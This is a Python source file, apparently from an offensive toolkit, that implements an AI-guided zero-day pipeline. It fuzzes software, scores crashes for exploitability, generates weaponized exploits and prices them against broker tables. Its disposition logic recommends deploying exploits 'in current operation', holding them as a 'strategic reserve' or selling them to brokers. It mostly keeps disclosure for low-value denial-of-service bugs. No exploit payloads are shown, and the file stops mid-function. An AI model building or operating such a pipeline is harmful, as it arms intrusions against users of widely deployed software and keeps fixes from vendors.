"""
server_core/orchestrator/zero_day_hunter.py

Automated Zero-Day Discovery Pipeline.

AI-guided fuzzing orchestration that targets software binaries and network
services to discover previously unknown vulnerabilities. The pipeline flows:

  1. Target Acquisition    — instrument binary/service for fuzzing
  2. Intelligent Fuzzing   — AI-guided code-path-aware mutation
  3. Crash Triage          — classify, deduplicate, and bucket crashes
  4. Crash Analysis        — symbolic execution (angr) for root-cause
  5. Exploitability        — EIP control, write primitive, use-after-free, ...
  6. Exploit Generation    — working PoC or full exploit
  7. Value Assessment      — market share x reliability x desirability
  8. Disposition Decision  — use_now, save, sell, bounty, disclose

Integrates with the existing PhantomStrike architecture: ToolBridge for
fuzzing harness execution, LLMClient for AI-guided mutation, and
AIExploitGenerator for exploit code generation.
"""

from __future__ import annotations

import copy
import hashlib
import json
import logging
import math
import os
import re
import subprocess
import tempfile
import threading
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# ============================================================================
# Enums
# ============================================================================

class CrashSeverity(Enum):
    """Severity bucket for a crash."""
    UNKNOWN = auto()
    NULL_DEREF = auto()          # Null pointer dereference
    SEGFAULT = auto()            # SIGSEGV — general segfault
    STACK_OVERFLOW = auto()      # Stack exhaustion
    HEAP_CORRUPTION = auto()     # Double-free, use-after-free, heap overflow
    ASSERT_FAIL = auto()         # Debug assertion failure
    OOM = auto()                 # Out of memory
    BUS_ERROR = auto()           # SIGBUS
    ILLEGAL_INSTRUCTION = auto() # SIGILL
    ABORT = auto()               # SIGABRT


class ExploitabilityTier(Enum):
    """How exploitable is this crash?"""
    NONE = 0             # Informational / no security impact
    DOS = 1              # Denial of service only
    POTENTIAL = 2        # Might be exploitable — needs deeper analysis
    LIKELY = 3           # Strong indicators of exploitability
    CONFIRMED = 4        # Confirmed exploitable (EIP control / write primitive)
    WEAPONIZED = 5       # Full working exploit exists


class Disposition(Enum):
    """What to do with a discovered zero-day."""
    USE_NOW = "use_now"        # Deploy immediately in current operation
    SAVE = "save"              # Retain for future high-value target
    SELL = "sell"              # Sell to broker / zerodium / crowdshield
    BOUNTY = "bounty"          # Submit to vendor bug-bounty program
    DISCLOSE = "disclose"      # Responsible disclosure to vendor / CERT
    DESTROY = "destroy"        # Burn it (too dangerous / opsec risk)
    UNKNOWN = "unknown"


class FuzzStrategy(Enum):
    """AI-guided fuzzing strategies."""
    COVERAGE_GUIDED = "coverage"         # AFL++ style coverage maximisation
    GRAMMAR_AWARE = "grammar"            # Input-format-aware mutation
    SYMBOLIC_GUIDED = "symbolic"         # SMT / concolic guided
    CODE_PATH_AWARE = "code_path"        # LLM-analysed input parsing paths
    HYBRID = "hybrid"                    # Combine multiple strategies


class FuzzerBackend(Enum):
    """Supported fuzzer backends."""
    AFLPLUSPLUS = "afl++"
    LIBFUZZER = "libfuzzer"
    HONGGFUZZ = "honggfuzz"
    CUSTOM = "custom"
    NETWORK = "network"         # boofuzz / spike-based network fuzzing


# ============================================================================
# Data classes
# ============================================================================

@dataclass
class SoftwareTarget:
    """Metadata about the software being fuzzed."""
    name: str
    version: str
    binary_path: Optional[str] = None
    source_path: Optional[str] = None
    target_type: str = "binary"  # binary, library, network_service, kernel
    arch: str = "x86_64"
    os: str = "linux"
    input_formats: List[str] = field(default_factory=list)  # e.g. ["png", "mp4"]
    network_ports: List[int] = field(default_factory=list)
    protocol: Optional[str] = None  # e.g. "HTTP", "SMB", "custom"
    harness_template: Optional[str] = None
    cvss_environmental: float = 1.0  # Environmental score modifier
    known_cves: List[str] = field(default_factory=list)
    market_share_estimate: float = 0.0  # 0.0–1.0 estimated deployment share


@dataclass
class FuzzSession:
    """A single fuzzing campaign session."""
    session_id: str
    target: SoftwareTarget
    strategy: FuzzStrategy = FuzzStrategy.HYBRID
    backend: FuzzerBackend = FuzzerBackend.AFLPLUSPLUS
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    total_executions: int = 0
    unique_crashes: int = 0
    coverage_pct: float = 0.0
    paths_found: int = 0
    status: str = "pending"  # pending, running, paused, completed, failed
    stats: Dict[str, Any] = field(default_factory=dict)
    crash_hashes: Set[str] = field(default_factory=set)


@dataclass
class CrashDump:
    """Structured crash-dump data."""
    crash_id: str
    session_id: str
    crash_hash: str  # Deduplication hash of backtrace + signal
    signal: int
    signal_name: str
    fault_address: str
    registers: Dict[str, str] = field(default_factory=dict)
    backtrace: List[str] = field(default_factory=list)
    crashing_instruction: Optional[str] = None
    memory_map: List[Dict[str, str]] = field(default_factory=list)
    input_data: Optional[bytes] = None
    input_size: int = 0
    severity: CrashSeverity = CrashSeverity.UNKNOWN
    asan_report: Optional[str] = None  # AddressSanitizer output if available
    core_dump_path: Optional[str] = None
    timestamp: Optional[datetime] = None


@dataclass
class CrashAnalysis:
    """Result of crash analysis via symbolic execution / static analysis."""
    crash_id: str
    crash: CrashDump
    root_cause: str = ""                # Human-readable root cause
    vulnerability_type: str = ""        # e.g. "heap_buffer_overflow"
    cwe_id: Optional[int] = None        # CWE mapping
    controlled_registers: List[str] = field(default_factory=list)
    controlled_memory_writes: List[Dict[str, Any]] = field(default_factory=list)
    controlled_memory_reads: List[Dict[str, Any]] = field(default_factory=list)
    stack_pivot_possible: bool = False
    rop_possible: bool = False
    aslr_bypass_possible: bool = False
    dep_bypass_possible: bool = False
    exploitability_tier: ExploitabilityTier = ExploitabilityTier.NONE
    exploitability_score: float = 0.0    # 0.0–1.0
    symbolic_constraints: List[str] = field(default_factory=list)
    suggested_exploit_type: Optional[str] = None
    confidence: float = 0.0              # Analysis confidence 0.0–1.0


@dataclass
class VulnerabilityFinding:
    """A complete zero-day finding — from crash to exploit."""
    finding_id: str
    target: SoftwareTarget
    crash: CrashDump
    analysis: CrashAnalysis
    exploit_code: Optional[str] = None
    exploitation_status: str = "unexploited"  # unexploited, poc, weaponized
    cvss_score: float = 0.0
    cvss_vector: str = ""
    market_value_usd: float = 0.0
    market_confidence: float = 0.0       # How confident is the valuation?
    disposition: Disposition = Disposition.UNKNOWN
    discovery_date: Optional[datetime] = None
    remediation_notes: str = ""
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    raw_metadata: Dict[str, Any] = field(default_factory=dict)


# ============================================================================
# Core class
# ============================================================================

class ZeroDayHunter:
    """AI-guided fuzzing pipeline. Finds NEW vulnerabilities and generates exploits.

    This orchestrates the full zero-day discovery lifecycle:

    1. **Target** — instrument the software for fuzzing
    2. **Fuzz**  — AI-guided, code-path-aware mutation
    3. **Triage** — classify, deduplicate, and bucket crashes
    4. **Analyse** — symbolic execution for root cause + exploitability
    5. **Exploit** — generate working PoC / weaponised exploit
    6. **Value** — estimate market value from market share, reliability, desirability
    7. **Decide** — disposition: use_now, save, sell, bounty, disclose

    Usage::

        hunter = ZeroDayHunter(tool_bridge=tb)
        hunter.target_software("nginx", "1.24.0", binary_path="/usr/sbin/nginx")
        hunter.intelligent_fuzz(session_id="sess-001", duration_minutes=120)
        status = hunter.get_pipeline_status("sess-001")
        for vuln in hunter.list_discoveries():
            print(vuln.analysis.exploitability_tier, vuln.market_value_usd)
    """

    # ------------------------------------------------------------------
    # Signal → human-readable name mapping
    # ------------------------------------------------------------------
    _SIGNAL_NAMES: Dict[int, str] = {
        4:  "SIGILL",
        5:  "SIGTRAP",
        6:  "SIGABRT",
        7:  "SIGBUS",
        8:  "SIGFPE",
        11: "SIGSEGV",
        13: "SIGPIPE",
    }

    # ------------------------------------------------------------------
    # Crash signal → default severity
    # ------------------------------------------------------------------
    _SIGNAL_SEVERITY: Dict[int, CrashSeverity] = {
        4:  CrashSeverity.ILLEGAL_INSTRUCTION,
        5:  CrashSeverity.ASSERT_FAIL,
        6:  CrashSeverity.ABORT,
        7:  CrashSeverity.BUS_ERROR,
        8:  CrashSeverity.UNKNOWN,
        11: CrashSeverity.SEGFAULT,
    }

    # ------------------------------------------------------------------
    # Exploitability scoring weights (additive factors → 0.0–1.0)
    # ------------------------------------------------------------------
    _EXPLOITABILITY_WEIGHTS: Dict[str, float] = {
        "eip_control":         0.35,
        "stack_write":         0.20,
        "heap_write":          0.25,
        "arbitrary_read":      0.15,
        "info_leak":           0.10,
        "stack_pivot":         0.20,
        "rop_gadgets_nearby":  0.15,
        "aslr_bypass":         0.25,
        "dep_bypass":          0.20,
        "null_deref":         -0.10,
        "access_violation":    0.05,
    }

    # ------------------------------------------------------------------
    # Market value multipliers (per target category)
    # ------------------------------------------------------------------
    _TARGET_DESIRABILITY: Dict[str, float] = {
        "browser":       0.95,
        "mobile_os":     0.92,
        "server_daemon": 0.85,
        "cloud_platform": 0.88,
        "router_fw":     0.70,
        "iot":           0.60,
        "desktop_app":   0.55,
        "library":       0.50,
        "unknown":       0.40,
    }

    # Baseline USD values for exploitation tiers at 100% market share
    _TIER_BASELINE_USD: Dict[ExploitabilityTier, float] = {
        ExploitabilityTier.NONE:       0,
        ExploitabilityTier.DOS:        5_000,
        ExploitabilityTier.POTENTIAL:  50_000,
        ExploitabilityTier.LIKELY:     150_000,
        ExploitabilityTier.CONFIRMED:  500_000,
        ExploitabilityTier.WEAPONIZED: 2_500_000,
    }

    # ------------------------------------------------------------------
    # Known zero-day broker buy-side price ranges (2024–2025 intel)
    # ------------------------------------------------------------------
    _BROKER_PRICE_REFERENCE: Dict[str, Tuple[float, float]] = {
        "ios_rce":              (500_000, 2_000_000),
        "android_rce":          (200_000, 1_500_000),
        "chrome_rce":           (100_000, 500_000),
        "windows_lpe":          (50_000,  250_000),
        "linux_kernel_lpe":     (30_000,  150_000),
        "apache_rce":           (20_000,  100_000),
        "nginx_rce":            (20_000,  100_000),
        "vmware_escape":        (100_000, 500_000),
        "cloud_escape":         (50_000,  300_000),
        "generic_daemon_rce":   (10_000,  50_000),
        "router_rce":           (5_000,   30_000),
        "iot_rce":              (2_000,   20_000),
    }

    def __init__(self, tool_bridge=None, llm_client=None, exploit_generator=None):
        """Initialise the ZeroDayHunter pipeline.

        Args:
            tool_bridge: Optional ToolBridge instance for fuzzer execution.
            llm_client: Optional LLMClient for AI-guided mutation analysis.
            exploit_generator: Optional AIExploitGenerator for exploit code.
        """
        self.tool_bridge = tool_bridge
        self._llm = llm_client
        self._exploit_gen = exploit_generator

        # Internal state
        self._targets: Dict[str, SoftwareTarget] = {}
        self._findings: List[VulnerabilityFinding] = []
        self._fuzz_sessions: Dict[str, FuzzSession] = {}
        self._crash_db: Dict[str, CrashDump] = {}       # crash_hash → CrashDump
        self._analysis_cache: Dict[str, CrashAnalysis] = {}  # crash_id → analysis
        self._lock = threading.Lock()

        # Lazy import placeholders
        self._angr_available = None
        self._afl_available = None

    # ==================================================================
    # Public API — Targeting
    # ==================================================================

    def target_software(
        self,
        name: str,
        version: str,
        binary_path: Optional[str] = None,
        source_path: Optional[str] = None,
        target_type: str = "binary",
        arch: str = "x86_64",
        os_name: str = "linux",
        input_formats: Optional[List[str]] = None,
        network_ports: Optional[List[int]] = None,
        protocol: Optional[str] = None,
        harness_template: Optional[str] = None,
        cvss_environmental: float = 1.0,
        market_share_estimate: float = 0.0,
    ) -> Dict[str, Any]:
        """Register a software target for zero-day hunting.

        Args:
            name: Software name (e.g. "nginx", "OpenSSH").
            version: Version string (e.g. "1.24.0").
            binary_path: Absolute path to the binary to fuzz.
            source_path: Path to source tree (for coverage instrumentation).
            target_type: One of binary, library, network_service, kernel.
            arch: Target architecture (x86_64, aarch64, etc.).
            os_name: Target OS.
            input_formats: List of input formats (e.g. ["png", "html"]).
            network_ports: Ports for network-service fuzzing.
            protocol: Protocol name for network fuzzing harness.
            harness_template: Custom harness code template.
            cvss_environmental: CVSS environmental score modifier.
            market_share_estimate: Estimated deployment share 0.0–1.0.

        Returns:
            Dict with target metadata and generated target_id.
        """
        target = SoftwareTarget(
            name=name,
            version=version,
            binary_path=binary_path,
            source_path=source_path,
            target_type=target_type,
            arch=arch,
            os=os_name,
            input_formats=input_formats or [],
            network_ports=network_ports or [],
            protocol=protocol,
            harness_template=harness_template,
            cvss_environmental=cvss_environmental,
            market_share_estimate=market_share_estimate,
        )

        target_id = self._make_target_id(name, version, arch)
        with self._lock:
            self._targets[target_id] = target

        logger.info(
            "ZeroDayHunter: target registered — %s %s (%s/%s) [id=%s]",
            name, version, arch, os_name, target_id,
        )

        return {
            "success": True,
            "target_id": target_id,
            "target": asdict(target),
            "warnings": self._validate_target(target),
        }

    def list_targets(self) -> List[Dict[str, Any]]:
        """List all registered software targets."""
        return [
            {"target_id": tid, **asdict(t)}
            for tid, t in self._targets.items()
        ]

    # ==================================================================
    # Public API — Intelligent Fuzzing
    # ==================================================================

    def intelligent_fuzz(
        self,
        session_id: str,
        input_seeds: Optional[List[str]] = None,
        duration_minutes: int = 60,
        strategy: str = "hybrid",
        backend: str = "afl++",
        max_crashes: int = 1000,
        parallel_instances: int = 1,
        memory_limit_mb: int = 4096,
        target_id: Optional[str] = None,
        extra_env: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """Launch an AI-guided fuzzing campaign.

        The fuzzer analyses the target binary's input parsing code (via the
        LLM) and guides mutations toward code paths most likely to contain
        vulnerabilities — this is NOT blind random fuzzing.

        Args:
            session_id: Unique session identifier.
            input_seeds: Paths to seed input files (corpus).
            duration_minutes: How long to fuzz (approximate).
            strategy: Fuzzing strategy (coverage, grammar, symbolic, code_path, hybrid).
            backend: Fuzzer backend (afl++, libfuzzer, honggfuzz, custom, network).
            max_crashes: Stop after this many unique crashes.
            parallel_instances: Number of parallel fuzzer processes.
            memory_limit_mb: Per-instance memory limit in MB.
            target_id: Which registered target to fuzz.
            extra_env: Additional environment variables for the fuzzer.

        Returns:
            Session status dict with fuzz_config, warnings, and estimated runtime.
        """
        # Resolve target
        if target_id is None:
            if len(self._targets) == 1:
                target_id = next(iter(self._targets))
            else:
                return {
                    "success": False,
                    "error": "Multiple targets registered — specify target_id. "
                             f"Available: {list(self._targets.keys())}",
                }

        target = self._targets.get(target_id)
        if target is None:
            return {"success": False, "error": f"Unknown target_id: {target_id}"}

        # Resolve strategy and backend enums
        try:
            fuzz_strategy = FuzzStrategy(strategy.replace("-", "_"))
        except ValueError:
            return {"success": False, "error": f"Unknown strategy: {strategy}. "
                     f"Valid: {[s.value for s in FuzzStrategy]}"}
        try:
            fuzz_backend = FuzzerBackend(backend.replace("+", "plus").lower())
        except ValueError:
            fuzz_backend = FuzzerBackend.CUSTOM

        # Build the fuzz configuration
        fuzz_config = self._build_fuzz_config(
            target=target,
            strategy=fuzz_strategy,
            backend=fuzz_backend,
            input_seeds=input_seeds,
            duration_minutes=duration_minutes,
            max_crashes=max_crashes,
            parallel_instances=parallel_instances,
            memory_limit_mb=memory_limit_mb,
            extra_env=extra_env,
        )

        # If we have an LLM, perform code-path analysis to guide the fuzzer
        ai_guidance = {}
        if self._llm is not None and self._llm.is_available():
            ai_guidance = self._ai_analyze_input_parsing(target, fuzz_config)

        # Create and store the session
        session = FuzzSession(
            session_id=session_id,
            target=target,
            strategy=fuzz_strategy,
            backend=fuzz_backend,
            start_time=datetime.now(timezone.utc),
            status="running",
            stats={"fuzz_config": fuzz_config, "ai_guidance": ai_guidance},
        )

        with self._lock:
            self._fuzz_sessions[session_id] = session

        # Execute the fuzzer (async in a background thread)
        thread = threading.Thread(
            target=self._execute_fuzz_campaign,
            args=(session, input_seeds or [], duration_minutes, max_crashes, fuzz_config, ai_guidance),
            daemon=True,
            name=f"fuzz-{session_id}",
        )
        thread.start()

        logger.info(
            "ZeroDayHunter: fuzz session %s launched — strategy=%s backend=%s target=%s",
            session_id, strategy, backend, target.name,
        )

        return {
            "success": True,
            "session_id": session_id,
            "target": target.name,
            "version": target.version,
            "strategy": strategy,
            "backend": backend,
            "duration_minutes": duration_minutes,
            "parallel_instances": parallel_instances,
            "fuzz_config": fuzz_config,
            "ai_guidance_applied": bool(ai_guidance),
            "warnings": self._validate_fuzz_readiness(target, fuzz_backend),
        }

    # ==================================================================
    # Public API — Crash Analysis
    # ==================================================================

    def analyze_crash(
        self,
        crash_dump: str,
        binary_path: str,
        use_angr: bool = True,
        llm_assist: bool = True,
    ) -> Dict[str, Any]:
        """Analyse a crash dump with symbolic execution to determine exploitability.

        Parses the crash dump (GDB output, ASAN report, or core dump), extracts
        register state and backtrace, then performs symbolic execution (via
        angr where available) to reconstruct the path to crash and identify
        controlled registers / memory writes.

        When angr is unavailable, falls back to heuristic analysis based on
        register values, backtrace patterns, and crash type — still useful
        for triage.

        Args:
            crash_dump: Raw crash dump text (GDB / ASAN / coredumpctl output).
            binary_path: Absolute path to the crashing binary.
            use_angr: Attempt symbolic execution with angr if installed.
            llm_assist: Use LLM to enhance root-cause analysis.

        Returns:
            Dict with crash_id, root_cause, exploitability_tier,
            controlled_registers, and exploitability_score.
        """
        # Parse the crash dump into structured data
        crash = self._parse_crash_dump(crash_dump, binary_path)
        if crash is None:
            return {"success": False, "error": "Failed to parse crash dump"}

        crash_hash = self._hash_crash(crash)
        crash.crash_hash = crash_hash

        # Deduplicate — return cached analysis if we have seen this crash
        with self._lock:
            existing = self._analysis_cache.get(crash.crash_id)
            if existing:
                logger.debug("Crash %s already analysed — returning cached result", crash_hash[:12])
                return self._analysis_to_dict(existing)

        # Classify crash severity
        crash.severity = self._classify_crash_severity(crash)

        # Perform symbolic analysis (angr) or fall back to heuristics
        if use_angr and self._check_angr_available():
            analysis = self._analyze_with_angr(crash, binary_path)
        else:
            analysis = self._heuristic_crash_analysis(crash, binary_path)

        # LLM-assisted root cause and exploitability assessment
        if llm_assist and self._llm is not None and self._llm.is_available():
            self._llm_enhance_analysis(analysis, crash_dump)

        # Determine exploitability
        analysis = self.determine_exploitability_inner(analysis)

        # Cache
        with self._lock:
            self._crash_db[crash_hash] = crash
            self._analysis_cache[crash.crash_id] = analysis

        logger.info(
            "Crash analysis complete: %s — %s (exploitability=%.2f tier=%s)",
            crash_hash[:12], analysis.root_cause[:80],
            analysis.exploitability_score, analysis.exploitability_tier.name,
        )

        return self._analysis_to_dict(analysis)

    def determine_exploitability(self, crash_analysis: dict) -> dict:
        """Public API — determine if a crash analysis result is exploitable.

        Accepts a dict from analyze_crash() and returns exploitability assessment.
        """
        # Reconstruct a CrashAnalysis from the dict
        analysis = self._dict_to_analysis(crash_analysis)
        updated = self.determine_exploitability_inner(analysis)
        return self._analysis_to_dict(updated)

    def determine_exploitability_inner(self, analysis: CrashAnalysis) -> CrashAnalysis:
        """Core exploitability determination — EIP control? Data write? DoS only?"""
        score = 0.0
        reasons: List[str] = []

        # Check controlled registers (RIP/EIP, RSP/ESP, etc.)
        controlled = analysis.controlled_registers
        if any(r.upper() in {"RIP", "EIP", "PC"} for r in controlled):
            score = max(score, self._EXPLOITABILITY_WEIGHTS["eip_control"])
            reasons.append("EIP/RIP control confirmed")
        if any(r.upper() in {"RSP", "ESP"} for r in controlled):
            score += self._EXPLOITABILITY_WEIGHTS["stack_pivot"]
            reasons.append("Stack pointer control — stack pivot possible")
        if any(r.upper() in {"RAX", "EAX", "RBX", "RCX", "RDX"} for r in controlled):
            score += 0.10
            reasons.append(f"GPR control: {[r for r in controlled if r.upper() in {'RAX','EAX','RBX','RCX','RDX'}]}")

        # Check memory write primitives
        writes = analysis.controlled_memory_writes
        if writes:
            for w in writes:
                if w.get("type") == "stack":
                    score += self._EXPLOITABILITY_WEIGHTS["stack_write"]
                    reasons.append("Controlled stack write")
                elif w.get("type") == "heap":
                    score += self._EXPLOITABILITY_WEIGHTS["heap_write"]
                    reasons.append("Controlled heap write — potential UAF / overflow")
                else:
                    score += 0.10
                    reasons.append("Controlled memory write (unknown region)")

        # Check memory read primitives
        reads = analysis.controlled_memory_reads
        if reads:
            score += self._EXPLOITABILITY_WEIGHTS["arbitrary_read"]
            reasons.append("Arbitrary read primitive — info leak possible")

        # Check mitigations bypassability
        if analysis.aslr_bypass_possible:
            score += self._EXPLOITABILITY_WEIGHTS["aslr_bypass"]
            reasons.append("ASLR bypass possible")
        if analysis.dep_bypass_possible:
            score += self._EXPLOITABILITY_WEIGHTS["dep_bypass"]
            reasons.append("DEP/NX bypass possible")

        # Stack pivot and ROP
        if analysis.stack_pivot_possible:
            score += self._EXPLOITABILITY_WEIGHTS["stack_pivot"]
            reasons.append("Stack pivot feasible")
        if analysis.rop_possible:
            score += self._EXPLOITABILITY_WEIGHTS["rop_gadgets_nearby"]
            reasons.append("ROP chain construction possible")

        # Null dereference penalty
        if analysis.crash.severity == CrashSeverity.NULL_DEREF:
            score += self._EXPLOITABILITY_WEIGHTS["null_deref"]
            reasons.append("Null dereference — may be unexploitable")

        # Clamp to [0.0, 1.0]
        score = max(0.0, min(1.0, score))

        # Map score to tier
        if score >= 0.75:
            tier = ExploitabilityTier.CONFIRMED
        elif score >= 0.45:
            tier = ExploitabilityTier.LIKELY
        elif score >= 0.15:
            tier = ExploitabilityTier.POTENTIAL
        elif analysis.crash.signal in {4, 5, 6, 11}:
            tier = ExploitabilityTier.DOS
        else:
            tier = ExploitabilityTier.NONE

        analysis.exploitability_score = score
        analysis.exploitability_tier = tier
        analysis.confidence = min(0.95, 0.3 + score * 0.6)

        # Suggest exploit type
        analysis.suggested_exploit_type = self._suggest_exploit_type(analysis, reasons)

        logger.debug(
            "Exploitability: score=%.2f tier=%s reasons=%s",
            score, tier.name, "; ".join(reasons),
        )

        return analysis

    # ==================================================================
    # Public API — Exploit Generation
    # ==================================================================

    def generate_exploit(
        self,
        crash_analysis: dict,
        target_url: str = "",
        payload_style: str = "poc",
    ) -> Dict[str, Any]:
        """Generate working exploit code from crash analysis.

        Uses the AIExploitGenerator when available, falling back to template-
        based PoC generation.

        Args:
            crash_analysis: Dict from analyze_crash().
            target_url: Optional target URL for network-service exploits.
            payload_style: poc (proof-of-concept), reliable, or weaponized.

        Returns:
            Dict with exploit_code, exploit_type, effectiveness_score.
        """
        analysis = self._dict_to_analysis(crash_analysis)

        # Try the full AIExploitGenerator first
        if self._exploit_gen is not None:
            try:
                result = self._exploit_gen_generate(analysis, target_url, payload_style)
                if result.get("success"):
                    return result
            except Exception as exc:
                logger.warning("AIExploitGenerator failed: %s — falling back to templates", exc)

        # Fallback: template-based PoC generation
        return self._template_based_exploit(analysis, target_url, payload_style)

    # ==================================================================
    # Public API — Value Assessment
    # ==================================================================

    def assess_vuln_value(self, vuln: dict) -> dict:
        """Assess the market value of a vulnerability.

        Factors:
          - Affected software market share (0.0–1.0)
          - Exploit reliability (tier-converted)
          - Target desirability (browser > server > IoT)
          - Known broker price references
          - CVSS base score

        Args:
            vuln: Vulnerability finding dict (from list_discoveries or build_finding).

        Returns:
            Dict with market_value_usd, value_confidence, breakdown.
        """
        # Extract key fields
        target = vuln.get("target", {})
        if isinstance(target, dict):
            market_share = target.get("market_share_estimate", 0.01)
            target_name = target.get("name", "unknown").lower()
            target_type = target.get("target_type", "unknown")
        else:
            market_share = getattr(target, "market_share_estimate", 0.01)
            target_name = getattr(target, "name", "unknown").lower()
            target_type = getattr(target, "target_type", "unknown")

        analysis = vuln.get("analysis", {})
        if isinstance(analysis, dict):
            tier_str = analysis.get("exploitability_tier", "NONE")
            exploit_score = analysis.get("exploitability_score", 0.0)
        else:
            tier_str = getattr(analysis, "exploitability_tier", ExploitabilityTier.NONE)
            if hasattr(tier_str, "name"):
                tier_str = tier_str.name
            exploit_score = getattr(analysis, "exploitability_score", 0.0)

        # Resolve tier
        try:
            tier = ExploitabilityTier[tier_str]
        except (KeyError, TypeError):
            tier = ExploitabilityTier.NONE

        # Base value from tier
        baseline = self._TIER_BASELINE_USD.get(tier, 0)

        # Desirability multiplier
        desirability = self._estimate_desirability(target_name, target_type)

        # Reliability multiplier (from exploitability score)
        reliability = 0.1 + exploit_score * 0.9

        # Cross-reference broker prices
        broker_ref = self._match_broker_reference(target_name, analysis)
        broker_low, broker_high = broker_ref if broker_ref else (0, 0)

        # Compute market value
        # Base formula: baseline * desirability * market_share * reliability
        computed_value = baseline * desirability * max(0.001, market_share) * reliability

        # Blend with broker reference if available
        if broker_high > 0:
            broker_mid = (broker_low + broker_high) / 2
            blend_weight = min(0.6, reliability)  # Weight broker more for reliable exploits
            final_value = computed_value * (1 - blend_weight) + broker_mid * blend_weight
            value_confidence = min(0.9, 0.4 + blend_weight * 0.5)
        else:
            final_value = computed_value
            value_confidence = min(0.7, 0.2 + reliability * 0.5)

        breakdown = {
            "tier_baseline_usd": baseline,
            "desirability_multiplier": round(desirability, 3),
            "reliability_multiplier": round(reliability, 3),
            "market_share_factor": round(max(0.001, market_share), 4),
            "computed_value_usd": round(computed_value, 2),
            "broker_reference_range": [broker_low, broker_high],
            "final_blended_value_usd": round(final_value, 2),
        }

        logger.info(
            "Valuation: %s → $%.0f (tier=%s desirability=%.2f reliability=%.2f confidence=%.2f)",
            target_name, final_value, tier.name, desirability, reliability, value_confidence,
        )

        return {
            "market_value_usd": round(final_value, 2),
            "value_confidence": round(value_confidence, 3),
            "breakdown": breakdown,
        }

    # ==================================================================
    # Public API — Disposition Decision
    # ==================================================================

    def decide_disposition(self, vuln: dict) -> str:
        """Decide what to do with this zero-day.

        Decision factors:
          - Exploitability tier
          - Market value
          - Whether the target is mission-relevant now
          - Bounty programme existence
          - Patch likelihood (actively maintained software?)
          - Operational security risk of holding

        Returns one of: use_now, save, sell, bounty, disclose, destroy, unknown.
        """
        value_info = vuln.get("market_value_usd", 0)
        if isinstance(value_info, dict):
            market_value = value_info.get("market_value_usd", 0)
        else:
            market_value = float(value_info)

        analysis = vuln.get("analysis", {})
        if isinstance(analysis, dict):
            tier_str = analysis.get("exploitability_tier", "NONE")
            exploit_score = analysis.get("exploitability_score", 0.0)
        else:
            tier_str = getattr(analysis, "exploitability_tier", "NONE")
            if hasattr(tier_str, "name"):
                tier_str = tier_str.name
            exploit_score = getattr(analysis, "exploitability_score", 0.0)

        try:
            tier = ExploitabilityTier[tier_str]
        except (KeyError, TypeError):
            tier = ExploitabilityTier.NONE

        target = vuln.get("target", {})
        if isinstance(target, dict):
            target_name = target.get("name", "unknown")
        else:
            target_name = getattr(target, "name", "unknown")

        disposition = Disposition.UNKNOWN
        reasoning: List[str] = []

        # Tier-based decision tree
        if tier in (ExploitabilityTier.NONE,):
            disposition = Disposition.DESTROY
            reasoning.append("Non-exploitable — not worth retaining")

        elif tier == ExploitabilityTier.DOS:
            if market_value > 10_000:
                disposition = Disposition.BOUNTY
                reasoning.append("DoS only but decent bounty value")
            else:
                disposition = Disposition.DISCLOSE
                reasoning.append("DoS only, low value — disclose for goodwill")

        elif tier == ExploitabilityTier.POTENTIAL:
            if market_value > 100_000:
                disposition = Disposition.SAVE
                reasoning.append("High potential value — save for strategic use")
            else:
                disposition = Disposition.BOUNTY
                reasoning.append("Medium value — bounty program")

        elif tier == ExploitabilityTier.LIKELY:
            if market_value > 300_000:
                disposition = Disposition.SELL
                reasoning.append(f"High value (${market_value:,.0f}) — consider broker sale")
            elif market_value > 50_000:
                disposition = Disposition.SAVE
                reasoning.append("Save for high-value target engagement")
            else:
                disposition = Disposition.BOUNTY
                reasoning.append("Submit to vendor bounty program")

        elif tier in (ExploitabilityTier.CONFIRMED, ExploitabilityTier.WEAPONIZED):
            if market_value > 1_000_000:
                disposition = Disposition.SELL
                reasoning.append(f"Seven-figure value (${market_value:,.0f}) — broker sale recommended")
            elif market_value > 200_000:
                disposition = Disposition.SAVE
                reasoning.append("Confirmed exploitable — strategic reserve")
            else:
                disposition = Disposition.USE_NOW
                reasoning.append("Exploitable — deploy in current operation")

        # Override: if target is actively maintained with known bounty program
        bounty_targets = {"chrome", "firefox", "safari", "ios", "android", "windows",
                          "linux kernel", "apache", "nginx", "openssh", "kubernetes"}
        if disposition in (Disposition.SELL, Disposition.SAVE) and target_name.lower() in bounty_targets:
            if market_value < 200_000:
                disposition = Disposition.BOUNTY
                reasoning.append("Active bounty program — likely better ROI than sale")

        logger.info(
            "Disposition: %s → %s — %s",
            target_name, disposition.value, "; ".join(reasoning),
        )

        return disposition.value

    # ==================================================================
    # Public API — Status & Discovery Listing
    # ==================================================================

    def get_pipeline_status(self, session_id: str) -> dict:
        """Get the current status of a fuzzing pipeline session."""
        session = self._fuzz_sessions.get(session_id)
        if session is None:
            return {"success": False, "error": f"No session found: {session_id}"}

        # Count associated crashes and findings
        session_crashes = [
            c for c in self._crash_db.values()
            if c.session_id == session_id
        ]
        session_analyses = [
            self._analysis_cache[c.crash_id]
            for c in session_crashes
            if c.crash_id in self._analysis_cache
        ]
        session_findings = [
            f for f in self._findings
            if f.crash.session_id == session_id
        ]

        return {
            "success": True,
            "session_id": session_id,
            "status": session.status,
            "target": {
                "name": session.target.name,
                "version": session.target.version,
                "arch": session.target.arch,
            },
            "runtime": {
                "start_time": session.start_time.isoformat() if session.start_time else None,
                "end_time": session.end_time.isoformat() if session.end_time else None,
                "elapsed_hours": self._elapsed_hours(session),
            },
            "fuzzing": {
                "strategy": session.strategy.value,
                "backend": session.backend.value,
                "total_executions": session.total_executions,
                "unique_crashes": session.unique_crashes,
                "coverage_pct": session.coverage_pct,
                "paths_found": session.paths_found,
            },
            "crashes": {
                "total": len(session_crashes),
                "by_severity": self._count_by(lambda c: c.severity.name, session_crashes),
                "by_signal": self._count_by(lambda c: c.signal_name, session_crashes),
            },
            "analyses": {
                "completed": len(session_analyses),
                "by_tier": self._count_by(lambda a: a.exploitability_tier.name, session_analyses),
            },
            "findings": {
                "count": len(session_findings),
                "weaponized": sum(1 for f in session_findings if f.exploitation_status == "weaponized"),
                "total_market_value_usd": sum(f.market_value_usd for f in session_findings),
            },
        }

    def list_discoveries(
        self,
        min_exploitability: Optional[str] = None,
